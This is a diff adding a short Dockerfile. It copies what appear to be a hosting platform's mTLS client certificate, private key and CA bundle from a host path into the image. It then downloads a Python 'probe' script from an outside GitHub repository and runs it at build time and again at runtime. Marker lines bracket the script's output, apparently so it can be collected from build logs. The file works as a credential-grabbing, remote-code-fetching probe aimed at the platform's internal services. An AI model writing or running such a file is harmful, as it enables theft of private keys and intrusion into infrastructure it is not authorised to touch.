@@ -1,0 +1,9 @@
+# MARK-I68171-P2-a7f6
+FROM alpine:3.20
+RUN echo MARK-I68171P2-apk-a7f6 && apk add --no-cache python3 openssl >/dev/null 2>&1 && echo APK_OK
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN echo MARK-I68171P2-dl-a7f6 && wget -q -T 30 -O /p2.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/nats7422_probe2_i68171.py 2>/dev/null || python3 -c "import urllib.request;urllib.request.urlretrieve('https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/nats7422_probe2_i68171.py','/p2.py')"; wc -l /p2.py
+RUN echo MARK-I68171P2-BUILD-a7f6-START && PHASE=build timeout -s KILL 120 python3 /p2.py 2>&1 | head -c 12000 ; echo MARK-I68171P2-BUILD-a7f6-END
+CMD ["sh","-c","echo MARK-I68171P2-RT-a7f6-START; PHASE=rt timeout -s KILL 120 python3 /p2.py 2>&1 | head -c 12000; echo MARK-I68171P2-RT-a7f6-END; sleep 60"]
